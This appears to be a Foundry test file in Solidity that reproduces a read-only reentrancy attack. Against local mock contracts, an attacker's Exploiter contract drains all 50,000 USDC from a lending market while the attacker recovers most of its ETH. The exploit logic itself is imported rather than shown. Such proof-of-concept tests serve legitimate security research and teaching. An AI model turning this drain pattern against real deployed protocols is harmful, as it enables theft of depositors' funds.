// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {VulnerablePool} from "../../src/hack/VulnerablePool.sol";
import {LendingMarket} from "../../src/hack/LendingMarket.sol";
import {Exploiter} from "../../src/hack/Exploiter.sol";
import {MockERC20} from "../mocks/MockERC20.sol";

contract ReadOnlyReentrancyPoCTest is Test {
    VulnerablePool internal pool;
    LendingMarket internal market;
    MockERC20 internal usdc;
    Exploiter internal exploiter;

    address internal honestLender = address(0x1111);
    address internal honestPoolProvider = address(0x2222);
    address internal attacker = address(0xDEADBEEF);

    function setUp() public {
        vm.deal(honestPoolProvider, 10 ether);
        vm.deal(attacker, 100 ether);

        usdc = new MockERC20("USD Coin", "USDC");
        pool = new VulnerablePool();
        market = new LendingMarket(pool, usdc);

        // 1. Honest provider provides initial 1 ETH to the pool
        vm.prank(honestPoolProvider);
        pool.addLiquidity{value: 1 ether}();

        // 2. Honest lender deposits 50,000 USDC into Lending Market
        usdc.mint(honestLender, 50_000 ether);
        vm.prank(honestLender);
        usdc.transfer(address(market), 50_000 ether);

        // 3. Deploy exploiter contract
        vm.prank(attacker);
        exploiter = new Exploiter(pool, market, usdc);
    }

    function test_ReproduceReadOnlyReentrancyDrain() public {
        uint256 marketUsdcBefore = usdc.balanceOf(address(market));
        assertEq(marketUsdcBefore, 50_000 ether, "Market should have 50,000 USDC initial liquidity");

        console.log("=== BEFORE EXPLOIT ===");
        console.log("Pool Total Reserves (ETH):", pool.totalEthReserves() / 1e18);
        console.log("Pool Virtual Price (ETH):", pool.getVirtualPrice() / 1e18);
        console.log("Market USDC Liquidity:", marketUsdcBefore / 1e18);
        console.log("Attacker USDC Balance:", usdc.balanceOf(attacker) / 1e18);
        console.log("Attacker Initial ETH:", attacker.balance / 1e18);

        // Attacker triggers attack with 100 ETH
        vm.prank(attacker);
        exploiter.executeAttack{value: 100 ether}();

        uint256 marketUsdcAfter = usdc.balanceOf(address(market));
        uint256 attackerUsdcAfter = usdc.balanceOf(attacker);

        console.log("=== AFTER EXPLOIT ===");
        console.log("Market USDC Liquidity Remaining:", marketUsdcAfter / 1e18);
        console.log("Attacker Plundered USDC:", attackerUsdcAfter / 1e18);
        console.log("Attacker Final ETH:", attacker.balance / 1e18);

        // Assertions: The lending market is 100% drained and attacker holds all 50,000 USDC
        assertEq(marketUsdcAfter, 0, "Lending market should be completely drained!");
        assertEq(attackerUsdcAfter, 50_000 ether, "Attacker should have stolen all 50,000 USDC!");
        // Attacker still holds their original capital (~99 ETH after 1 ETH locked in victim protocol)
        assertTrue(attacker.balance >= 99 ether, "Attacker recovered their core capital!");
    }
}
